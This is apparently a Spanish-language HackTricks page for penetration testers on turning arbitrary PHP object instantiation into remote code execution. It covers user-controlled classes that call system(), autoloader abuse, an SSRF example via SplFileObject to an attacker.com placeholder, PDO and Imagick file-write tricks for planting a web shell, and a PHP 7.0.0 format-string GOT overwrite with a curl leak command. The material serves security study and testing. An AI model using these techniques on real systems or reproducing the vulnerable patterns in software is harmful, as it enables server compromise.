# PHP - RCE abusando de la creación de objetos: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Esto es básicamente un resumen de [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Introducción

La creación de nuevos objetos arbitrarios, como `new $_GET["a"]($_GET["a"])`, puede conducir a Remote Code Execution (RCE), como se detalla en un [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Este documento destaca varias estrategias para lograr RCE.

## RCE a través de clases personalizadas o autoloading

La sintaxis `new $a($b)` se usa para instanciar un objeto donde **`$a`** representa el nombre de la clase y **`$b`** es el primer argumento pasado al constructor. Estas variables pueden provenir de entradas de usuario como GET/POST, donde pueden ser cadenas o arrays, o de JSON, donde pueden presentarse como otros tipos.

Considere el siguiente fragmento de código:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
En este caso, establecer `$a` a `App` o `App2` y `$b` a un comando del sistema (por ejemplo, `uname -a`) resulta en la ejecución de ese comando.

**Funciones de auto-carga** pueden ser explotadas si tales clases no son directamente accesibles. Estas funciones cargan automáticamente clases desde archivos cuando se necesitan y se definen usando `spl_autoload_register` o `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
El comportamiento del autoloading varía según la versión de PHP, ofreciendo diferentes posibilidades de RCE.

## RCE via Built-In Classes

Si faltan clases personalizadas o autoloaders, las **clases integradas de PHP** pueden ser suficientes para RCE. El número de estas clases varía entre 100 y 200, según la versión de PHP y las extensiones. Pueden listarse usando `get_declared_classes()`.

Los constructores de interés pueden identificarse mediante la reflection API, como se muestra en el siguiente ejemplo y en el enlace [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via specific methods includes:**

### **SSRF + Phar Deserialization**

La clase `SplFileObject` permite SSRF a través de su constructor, permitiendo conexiones a cualquier URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF puede conducir a deserialization attacks en versiones de PHP anteriores a la 8.0 usando el protocolo Phar.

### **Exploiting PDOs**

El constructor de la clase PDO permite conexiones a bases de datos mediante cadenas DSN, lo que potencialmente habilita la creación de archivos u otras interacciones:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Versiones de PHP hasta 5.3.22 y 5.4.12 eran susceptibles a ataques XXE a través de los constructores de `SoapClient` y `SimpleXMLElement`, dependiendo de la versión de libxml2.

## RCE vía la extensión Imagick

En el análisis de las dependencias de un **proyecto**, se descubrió que **Imagick** podía aprovecharse para **ejecución de comandos** al instanciar nuevos objetos. Esto presenta una oportunidad para explotar vulnerabilidades.

### VID parser

Se identificó la capacidad del VID parser para escribir contenido en cualquier ruta especificada del sistema de archivos. Esto podría conducir a la colocación de un PHP shell en un directorio accesible vía web, logrando Remote Code Execution (RCE).

#### VID Parser + File Upload

Se observa que PHP almacena temporalmente los archivos subidos en `/tmp/phpXXXXXX`. El VID parser en Imagick, utilizando el protocolo **msl**, puede manejar comodines en rutas de archivos, facilitando la transferencia del archivo temporal a una ubicación elegida. Este método ofrece un enfoque adicional para conseguir escritura arbitraria de archivos en el sistema de archivos.

### PHP Crash + Brute Force

Un método descrito en el [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) consiste en subir archivos que provocan un crash del servidor antes de su eliminación. Mediante brute-forcing del nombre del archivo temporal, se vuelve posible que Imagick ejecute código PHP arbitrario. Sin embargo, se constató que esta técnica solo era efectiva en una versión desactualizada de ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Cuando la entrada del usuario controla el nombre de la clase (p.ej., `new $_GET['model']()`), PHP 7.0.0 introdujo un bug transitorio durante la refactorización de `Throwable` en el que el motor trataba por error el nombre de la clase como una cadena de formato printf durante la resolución. Esto habilita primitivas clásicas al estilo printf dentro de PHP: leaks con `%p`, control del conteo de escritura con especificadores de ancho, y escrituras arbitrarias con `%n` sobre punteros en proceso (por ejemplo, entradas GOT en builds ELF).

Patrón mínimo de repro vulnerable:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Esquema de explotación (según la referencia):
- Leak direcciones vía `%p` en el nombre de la clase para encontrar un objetivo escribible:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Usa parámetros posicionales y especificadores de ancho para fijar un conteo exacto de bytes, luego `%n` para escribir ese valor en una dirección accesible en el stack, apuntando a un GOT slot (p. ej., `free`) para sobrescribir parcialmente hacia `system`.
- Activa la función secuestrada pasando un nombre de clase que contenga un shell pipe para llamar a `system("id")`.

Notas:
- Funciona solo en PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); corregido en versiones posteriores. Severidad: crítica si existe instanciación arbitraria de clases.
- Los payloads típicos encadenan muchos `%p` para recorrer el stack, luego `%.<width>d%<pos>$n` para lograr la sobrescritura parcial.

## Referencias

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
